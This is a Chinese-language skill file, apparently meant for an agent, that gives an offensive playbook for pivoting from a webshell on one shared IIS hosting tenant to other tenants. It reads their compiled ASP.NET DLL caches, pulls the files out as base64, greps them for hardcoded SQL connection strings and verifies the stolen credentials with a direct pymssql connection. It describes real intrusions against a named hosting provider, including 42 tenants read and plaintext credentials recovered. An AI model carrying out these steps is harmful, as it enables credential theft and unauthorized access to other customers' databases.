---
name: shared-hosting-cache-pivot
description: 共享IIS主机横向 - 读ASP.NET编译缓存挖其他租户硬编码连接串
---

# 共享主机编译缓存横向

## 触发条件
拿到共享托管主机(IIS)上一个租户的 webshell，想横向到同机其他租户的数据库/数据。
(实测战例: site4now 农场, 一个 shell 读出 42 租户编译 DLL, 挖出 2 组明文 SQL 凭据)

## 原理
ASP.NET 站点编译后的 DLL 缓存在:
`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\Root\<租户哈希>\<哈希>\assembly\dl3\<哈希>\Xxx.DLL`

Root 目录 ACL 通常给 `BUILTIN\IIS_IUSRS:(OI)(CI)(M,DC)`。所有 IIS 应用池账户自动
属于 IIS_IUSRS 组 → 任意一个租户的 shell 能读/写所有租户的编译 DLL。

开发人员常把数据库连接串硬编码在代码里(而非 web.config)，编译后明文密码进 DLL
字符串 → 反编译/strings grep 就能挖出来。

## 步骤
1. 确认路径 + ACL:
   `icacls "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\Root"`
   看 IIS_IUSRS 是否有 M/D 权限。
2. 枚举租户目录: `dir "…\Root" /b` → 得到一批租户哈希目录(如 42 个)。
3. 枚举业务 DLL(排除框架):
   PowerShell 递归找 `assembly\dl3` 下的 DLL，排除
   `^(Microsoft|System|AjaxControlToolkit|Newtonsoft|EntityFramework|MySql|Oracle|Npgsql|Dapper|log4net|NLog|AutoMapper|Castle|DevExpress|Telerik|EPPlus|itextsharp|RestSharp|ClosedXML|DocumentFormat|Azure|Cloudinary|Facebook|Google|Razorpay|zxing|Owin|Ninject|Hangfire|Antlr|WebGrease)`
4. 下载 DLL(webshell 无读文件接口时):
   `[Convert]::ToBase64String([IO.File]::ReadAllBytes("<path>"))` 回显 → 本地 base64 解码。
5. 提取连接串: strings 提取 ASCII + UTF-16LE，grep
   `Data Source|Initial Catalog|User ID|Password|pwd|sql5\d+|site4now|smarterasp|1433`

## 关键坑
- `dir` 路径含空格必须加引号，否则报 "The system cannot find the file specified"(不是权限问题)。
- 换更高权限的立足点可能读到更多租户(战例: uscrec 只读到 10 个, forcits 读到 42 个)。
- 别轻易下"无硬编码连接串"结论——不同租户情况不同，且连接串也可能在 web.config(租户隔离读不到)，DLL 里只有 `baseConnectionStringName` 引用。
- 凭据存数据库加密(如 `get_XxxDecrypt`、`MPAccessToken` 表)的租户，DLL 里只有字段名没明文，这条链断。

## 验证
拿凭据后 pymssql 直连: `pymssql.connect(host, user, pw, db, port=1433)`
查 `@@SERVERNAME` / `sys.databases` / 大表行数(`sys.tables JOIN sys.partitions`)判断数据量。
site4now SQL 农场公网 sql5xxx.site4now.net:1433 直连可达，无需隧道。
